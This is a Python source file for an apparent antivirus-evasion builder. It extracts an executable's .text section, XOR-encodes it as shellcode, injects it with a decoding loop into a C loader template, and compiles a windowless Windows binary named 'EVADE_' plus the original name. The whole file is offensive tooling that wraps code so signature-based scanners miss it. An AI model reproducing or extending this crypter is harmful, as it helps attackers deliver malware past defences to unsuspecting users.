# main.py

import lief
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
import os
import sys
from pathlib import Path

def xor_encode_shellcode(shellcode_bytes, key=0xAA):
    return bytes(b ^ key for b in shellcode_bytes), key


def extract_text_section(exe_path):
    binary = lief.parse(exe_path)
    text_section = binary.get_section(".text")
    return text_section.content, text_section.virtual_address

def disassemble_code(code_bytes, base_addr):
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    md.detail = True
    return list(md.disasm(bytes(code_bytes), base_addr))

def basic_obfuscation(instructions):
    obfuscated = []
    for ins in instructions:
        obfuscated.append(ins)
        if ins.mnemonic not in ['nop', 'ret']:
            # Append a fake NOP entry as a tuple
            fake_nop = (ins.address + 1, 'nop', '')
            obfuscated.append(fake_nop)
    return obfuscated


def write_disassembly(instructions, out_path):
    with open(out_path, "w") as f:
        for ins in instructions:
            if isinstance(ins, tuple):
                f.write(f"0x{ins[0]:x}:\t{ins[1]}\t{ins[2]}\n")
            else:
                f.write(f"0x{ins.address:x}:\t{ins.mnemonic}\t{ins.op_str}\n")


def write_text_section(code_bytes, out_path):
    with open(out_path, "wb") as f:
        f.write(bytearray(code_bytes))

def make_output_dir(base_path):
    output_dir = Path("artifacts") / Path(base_path).stem
    output_dir.mkdir(parents=True, exist_ok=True)
    return output_dir

import subprocess

def build_new_exe(shellcode_path, output_exe_path):
    print("[*] Building new .exe with XOR-encoded shellcode...")

    with open("stub_template.c", "r") as f:
        template = f.read()

    with open(shellcode_path, "rb") as f:
        shellcode_bytes = f.read()

    encoded_shellcode, key = xor_encode_shellcode(shellcode_bytes)

    shellcode_c = ','.join(f'0x{b:02x}' for b in encoded_shellcode)
    decoder_stub = f"""
    for (int i = 0; i < sizeof(shellcode); i++) {{
        shellcode[i] ^= 0x{key:02x};
    }}
    """

    stub_code = template.replace("SHELLCODE_PLACEHOLDER", f"{{{shellcode_c}}}")
    stub_code = stub_code.replace("// DECODE_STUB", decoder_stub)

    stub_file = "loader.c"
    with open(stub_file, "w") as f:
        f.write(stub_code)

    compile_cmd = [
        "i686-w64-mingw32-gcc",
        stub_file,
        "-o", output_exe_path,
        "-fno-stack-protector",
        "-mwindows"
    ]

    print(f"[*] Compiling: {' '.join(compile_cmd)}")
    subprocess.run(compile_cmd, check=True)
    print(f"[+] Built: {output_exe_path}")



def main():
    if len(sys.argv) != 2:
        print("Usage: python main.py <path_to_exe>")
        sys.exit(1)

    exe_path = sys.argv[1]
    output_dir = make_output_dir(exe_path)

    code_bytes, base_addr = extract_text_section(exe_path)
    disassembled = disassemble_code(code_bytes, base_addr)
    obfuscated = basic_obfuscation(disassembled)

    disasm_path = output_dir / "obfuscated_disassembly.txt"
    raw_shellcode_path = output_dir / "text_section.bin"
    output_exe = output_dir / f"EVADE_{Path(exe_path).name}"

    # ✅ Write artifacts BEFORE building
    write_disassembly(obfuscated, disasm_path)
    write_text_section(code_bytes, raw_shellcode_path)

    # ✅ Then build the final obfuscated exe
    build_new_exe(raw_shellcode_path, str(output_exe))

    print(f"[+] Output saved in: {output_dir}")
    print(f"    - Disassembly: {disasm_path}")
    print(f"    - Raw Shellcode: {raw_shellcode_path}")
    print(f"    - Final EXE: {output_exe}")

if __name__ == "__main__":
    main()
